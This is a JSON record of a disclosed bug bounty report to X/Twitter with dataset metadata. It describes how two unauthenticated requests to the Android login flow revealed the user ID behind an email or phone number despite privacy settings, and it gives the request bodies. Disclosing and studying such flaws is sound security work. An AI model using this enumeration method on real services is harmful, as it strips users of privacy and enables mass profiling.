{
  "reported_to": "X (Formerly Twitter)",
  "reported_by": "zhirinovskiy ",
  "title": "Discoverability by phone number/email restriction bypass",
  "content": "\nSummary: By using this vulnerability an attacker can find a twitter account by it's phone number/email even if the user has prohibited this in the privacy options.\nDescription: The vulnerability allows any party without any authentication to obtain a twitter ID(which is almost equal to getting the username of an account) of any user by submitting a phone number/email even though the user has prohibitted this action in the privacy settings. The bug exists due to the proccess of authorization used in the Android Client of Twitter, specifically in the procces of checking the duplication of a Twitter account.\nSteps To Reproduce:\nIn this example I will show you how to get a Twitter ID of a user with an email \"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\" (this an account created by me to demonstrate this bug)\n0.Disable discoverability in your Twitter account settings\nAt first we create a LoginFlow by sending a POST request to https://api.twitter.com/1.1/onboarding/task.json?flow_name=login\nHeaders (stay the same for all the requests):\nUser-Agent: \u2588\u2588\u2588\u2588 (\u2588\u2588\u2588\u2588)\nAccept-Encoding: gzip, deflate\nAuthorization: Bearer \u2588\u2588\u2588\u2588\u2588\u2588\u2588\nX-Guest-Token: \u2588\u2588\u2588\u2588\u2588 #This value changes dynamically and must be generated every once in a while\nAccept: application/json\nX-Twitter-Client: TwitterAndroid\nSystem-User-Agent: \u2588\u2588\u2588\u2588\u2588\u2588\nContent-Encoding: application/json\nContent-Type: application/json\nAccept-Language: en-US\nBody:\n{\"flow_token\":null,\"input_flow_data\":{\"country_code\":null,\"flow_context\":{\"start_location\":{\"location\":\"deeplink\"}},\"requested_variant\":null,\"target_user_id\":0}}\nResponse:\n{\"flow_token\":\"\u2588\u2588\u2588\u2588\u2588\u2588\",\"status\":\"success\",\"subtasks\":[{\"subtask_id\":\"LoginEnterUserIdentifier\",\"enter_text\":{\"primary_text\":{\"text\":\"To get started, first enter your phone, email, or @username\",\"entities\":[]},\"hint_text\":\"Phone, email, or username\",\"multiline\":false,\"auto_capitalization_type\":\"none\",\"auto_correction_enabled\":false,\"os_content_type\":\"username\",\"keyboard_type\":\"text\",\"next_link\":{\"link_type\":\"task\",\"link_id\":\"next_link\",\"label\":\"Next\"},\"skip_link\":{\"link_type\":\"subtask\",\"link_id\":\"forget_password\",\"label\":\"Forgot password?\",\"subtask_id\":\"RedirectToPasswordReset\"}},\"subtask_back_navigation\":\"cancel_flow\"},{\"subtask_id\":\"RedirectToPasswordReset\",\"open_link\":{\"link\":{\"link_type\":\"deep_link_and_abort\",\"link_id\":\"password_reset_deep_link\",\"url\":\"twitter://onboarding/task?flow_name=password_reset&input_flow_data=%7B%22requested_variant%22%3A%\u2588\u2588\u2588%22%7D\"}}}]}\nAs you can see we have aquired the flow token value which is used in the next request.\nSend a POST request to https://api.twitter.com/1.1/onboarding/task.json with the same headers and a flow token aquired in the previous response\nBody:\n{\"flow_token\":\"\u2588\u2588\u2588\u2588\u2588\u2588\",\"subtask_inputs\":[{\"enter_text\": {\"suggestion_id\":null, \"text\": \"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\", \"link\": \"next_link\"},\n\"subtask_id\": \"LoginEnterUserIdentifier\"}]}\nResponse:\n{\"flow_token\":\"\u2588\u2588\u2588\u2588\",\"status\":\"success\",\"subtasks\":[{\"subtask_id\":\"AccountDuplicationCheck\",\"check_logged_in_account\":{\"true_link\":{\"link_type\":\"task\",\"link_id\":\"AccountDuplicationCheck_true\"},\"false_link\":{\"link_type\":\"task\",\"link_id\":\"AccountDuplicationCheck_false\"},\"user_id\":\"\u2588\u2588\u2588\"}}]}\nAs you can see we have aquired the user ID which can then be used to get the full info about the twitter account (there are many ways to do this), even though I have disabled discoverability in my user settings!\nImpact:\nThis is a serious threat, as people can not only find users who have restricted the ability to be found by email/phone number, but any attacker with a basic knowledge of scripting/coding can enumerate a big chunk of the Twitter user base unavaliable to enumeration prior (create a database with phone/email to username connections). Such bases can be sold to malicious parties for advertising purposes, or for the purposes of tageting celebrities in different malicious activities\nAlso a cool feature that I discoverd is that you can even find the id's of suspended Twitter accounts using this method.\nSupporting Material/References:\n\u2588\u2588\u2588\u2588\u2588\u2588 A simple console Python script that demonstrates this vulnerabilty (requires the requests library to run)\nImpact\nThis is a serious threat, as people can not only find users who have disbaled discoverability by email/phone number, but any attacker with a basic knowledge of scripting/coding can enumerate a big chunk of the Twitter user base unavaliable to enumeration prior (create a database with phone/email to username connections). Such bases can be sold to malicious parties for advertising purposes, or for the purposes of tageting celebrities in different malicious activities.\nShort: this can lead to a loss of privacy for many users.\n\n",
  "severity": [
    8.2,
    null
  ],
  "bounty": 5040,
  "weaknesses": [
    "Improper Access Control - Generic"
  ],
  "screenshots": {},
  "disclosed_date": 1644616800,
  "report_url": "https://hackerone.com/reports/1439026",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "API",
  "steps": [
    [
      0,
      "Disable discoverability in your Twitter account settings"
    ],
    [
      1,
      "Create a LoginFlow by sending a POST request to https://api.twitter.com/1.1/onboarding/task.json?flow_name=login with specific headers and body"
    ],
    [
      2,
      "Send a POST request to https://api.twitter.com/1.1/onboarding/task.json with the flow token acquired in the previous response"
    ],
    [
      3,
      "Acquire the user ID from the response, which can then be used to get full info about the Twitter account"
    ]
  ],
  "vuln_description": "This vulnerability allows an attacker to discover a Twitter account by its phone number or email even if the user has disabled this feature in privacy settings. The attacker can obtain the Twitter ID (equivalent to the username) by exploiting the authorization process in the Twitter Android client during account duplication checks.",
  "reason": "The vulnerability involves understanding the Twitter Android client's authorization process, specifically the account duplication check, and manipulating the flow to bypass privacy settings. It requires knowledge of API interactions and the ability to craft specific requests, but the steps are relatively straightforward once the API endpoints and required headers are known.",
  "new_complexity": "MEDIUM",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "idor_detectable": false,
  "authnz_byppass_detectable": true,
  "is_simple_payload": false,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reasoning": "The vulnerability involves bypassing authorization checks during the account duplication check flow. The methodology's step d (executing actions with unauthenticated sessions) and step e (substituting resource_ids) would detect this, as the attack uses unauthenticated requests (guest tokens) and substitutes resource_ids (emails/phone numbers) to retrieve user IDs. The authorization boundary (discoverability setting) is bypassed via an unprotected API endpoint, fitting the AuthZ bypass class.",
    "is_simple_authnz": true
  }
}